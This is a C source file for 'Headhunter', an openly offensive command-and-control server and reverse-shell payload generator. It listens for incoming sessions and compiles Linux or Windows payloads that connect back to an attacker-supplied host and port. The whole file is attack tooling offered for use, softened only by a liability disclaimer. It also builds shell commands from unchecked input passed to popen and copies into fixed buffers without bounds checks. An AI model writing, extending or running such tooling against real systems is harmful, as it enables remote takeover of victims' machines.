// Recruiter Command and Control Server (C2) and payload generator
// Author: Logan Goins
//
// I am not liable for any malicious or illegal action
// that any user commits using this software.
// TODO:
// Include session switching
// Display IP address of connecting device

#include "include/socketServer.h"
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>


int main(int argc, char **argv){


  printf(R"EOF(

  
 ██░ ██ ▓█████ ▄▄▄      ▓█████▄  ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
▓██░ ██▒▓█   ▀▒████▄    ▒██▀ ██▌▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▒███  ▒██  ▀█▄  ░██   █▌▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░▓█ ░██ ▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓░▒████▒▓█   ▓██▒░▒████▓ ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░ ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░   ░    ░   ▒    ░ ░  ░  ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
 ░  ░  ░   ░  ░     ░  ░   ░     ░  ░  ░   ░              ░             ░  ░   ░     
                         ░                                                           

  Command and Control Server (C2) and Payload Generator
  Author: Logan Goins


)EOF");


  if(argc <= 1){
    printf("No command specified, type \"./headhunter --help\" for a list of commands\n\n");
  }

  else if((argc > 0 && strcmp(argv[1], "--help") == 0) || strcmp(argv[1], "-h") == 0){
    printf("\nCommands\n--------------------------------------------------------\n");
    printf("-h, --help                                             displays this help menu\n");
    printf("-l, --listen <port>                                    starts a listening C2 server on a specified port\n");
    printf("-g, --generate <Payload Generation Options>            generates a reverse shell payload to connect back to a recruiter session\n\n");
    printf("\nPayload Generation Options\n--------------------------------------------------------\n");
    printf("-p, --port <port>                                      port for the reverse shell to connect back on\n");
    printf("-o, --output <outputfile>                              file to output payload to\n");
    printf("-w, --platform <platform>                              file payload platform specific (linux, win32, or win64)\n");
    printf("-l, --localhost <address>                              address that the payload will connect back to (address of attacker C2 server)\n\n");
  }  

  else if((argc > 1 && strcmp(argv[1], "--listen") == 0) || strcmp(argv[1], "-l") == 0){
    if (argc < 3){
      printf("Please supply a port for the server to listen on\n\n");
    } 
    else{
    char *port = argv[2];
    int protocol = SOCK_STREAM;
    int family = AF_INET;
    Server(NULL, port, &protocol, &family);
    }
  }
  


  else if((argc >= 5 && strcmp(argv[1], "--generate") == 0) || strcmp(argv[1], "-g") == 0){
    

    if (argc < 5){
      printf("Specify all of the options required to generate the payload\n");
    }
    else{
      
      char param[30] = " -D ";
      char portvar[30] = "PORT=";
      char targetvar[30] = "LHOST=";
      char ip_escape[10] = "\\\"";
      char platform[50];
      char outfile[50];
      char lhost[50];
      char port[30];
      char unix_cmd[100] = "gcc payload_linux.c -o ";
      char win64_cmd[150] = "x86_64-w64-mingw32-gcc payload_win.c -o ";
      char win32_cmd[150] = "i686-w64-mingw32-gcc payload_win.c -o ";
      char winlib[30] = " -lws2_32";

      for(int i = 0; argv[i]; i++){
        if(strcmp(argv[i], "--platform") == 0 || strcmp(argv[i], "-w") == 0){
          strcpy(platform, argv[i + 1]);
        }
        else if(strcmp(argv[i], "--output") == 0 || strcmp(argv[i], "-o") == 0){
          strcpy(outfile, argv[i + 1]);
        }
        else if(strcmp(argv[i], "--localhost") == 0 || strcmp(argv[i], "-l") == 0){
          strcpy(lhost, argv[i + 1]);
        }
        else if(strcmp(argv[i], "--port") == 0 || strcmp(argv[i], "-p") == 0){
          strcpy(port, argv[i + 1]);
        }
  
      }
      for(int i = 0; platform[i]; i++){
        platform[i] = tolower(platform[i]);
      }

      if(strcmp(platform, "linux") == 0){
         // build command string
         // gcc payload_linux.c -D PORT=4444 -D target=\"127.0.0.1\" -o payload
         strcat(unix_cmd, outfile);
         strcat(unix_cmd, param);
         strcat(unix_cmd, portvar);
         strcat(unix_cmd, port);
         strcat(unix_cmd, param);
         strcat(unix_cmd, targetvar);
         strcat(unix_cmd, ip_escape);
         strcat(unix_cmd, lhost);
         strcat(unix_cmd, ip_escape);
         popen(unix_cmd, "r");
         printf("Generated payload successfully for platform: %s\n", platform);
      }
      else if(strcmp(platform, "win64") == 0){
         // build command string
         // x86_64-w64-mingw32-gcc payload_win.c -o win32.exe -D LHOST=\"127.0.0.1\" -D PORT=4444 -lws2_32
         strcat(win64_cmd, outfile);
         strcat(win64_cmd, param);
         strcat(win64_cmd, portvar);
         strcat(win64_cmd, port);
         strcat(win64_cmd, param);
         strcat(win64_cmd, targetvar);
         strcat(win64_cmd, ip_escape);
         strcat(win64_cmd, lhost);
         strcat(win64_cmd, ip_escape);
         strcat(win64_cmd, winlib);
         popen(win64_cmd, "r");
         printf("Generated payload successfully for platform: %s\n", platform);
          
      }
      else if(strcmp(platform, "win32") == 0){
         // build command string
         // i686-w64-mingw32-gcc payload_win.c -o payload.exe -D LHOST=\"127.0.0.1\" -D PORT=4444 -lws2_32
         strcat(win32_cmd, outfile);
         strcat(win32_cmd, param);
         strcat(win32_cmd, portvar);
         strcat(win32_cmd, port);
         strcat(win32_cmd, param);
         strcat(win32_cmd, targetvar);
         strcat(win32_cmd, ip_escape);
         strcat(win32_cmd, lhost);
         strcat(win32_cmd, ip_escape);
         strcat(win32_cmd, winlib);
         popen(win32_cmd, "r");
         printf("Generated payload successfully for platform: %s\n", platform);
          

      }
      else{
         printf("Please enter a valid platform\n");
      }
    }
  }

  else {
    printf("Invalid command, type \"headhunter --help\" for help");
  }

  return 0;  
}
